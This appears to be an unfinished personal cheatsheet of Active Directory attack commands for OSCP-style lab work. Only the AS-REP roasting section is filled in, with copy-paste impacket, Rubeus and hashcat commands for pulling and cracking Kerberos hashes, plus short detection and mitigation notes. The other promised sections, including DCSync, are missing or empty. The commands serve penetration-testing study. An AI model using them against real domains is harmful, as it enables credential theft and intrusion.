---
title: "AD Cheatsheets — AS-REP / Kerberoast / PtH / PtT / DCSync"
tags: [cheatsheet, AD, kerberoast, asrep, pth, ptt, dcsync]
last_updated: 2025-10-17
---

# AD Cheatsheets (quick copy-paste commands)

---
## 1) AS-REP Roasting — quick
**What:** Request AS-REP responses for accounts without pre-auth and crack offline to recover plaintext passwords.  
**Privileges needed:** None (targets must have `DONT_REQUIRE_PREAUTH` set).  
```bash
# OSCP-A live example
impacket-GetNPUsers -dc-host dc01.oscp.exam -dc-ip 10.10.158.140 -usersfile ./loot/oscp_users.txt -request -format hashcat -outputfile asreproast.hash oscp.exam/

# I think this command is wrong, and will be ./invoke-rubeus.ps1
# Invoke-Rubeus -Command "<rubeus_arguments>"
Rubeus.exe asreproast /user:svc_account /domain:corp.local /outfile:asrep.hashes

# Crack with hashcat (example hashcat mode 18200 for AS-REP):
hashcat -m 18200 asrep.hashes /path/to/wordlist.txt
```
**Detection / Mitigation**
- Detect unusual AS-REP requests or many failed crack attempts; monitor Kerberos logs (event id 4768/4771 patterns).
- Mitigate by disabling `DONT_REQUIRE_PREAUTH` on accounts or enforcing strong/long passwords and monitoring for preauth anomalies.





---

## 5) DCSync — quick



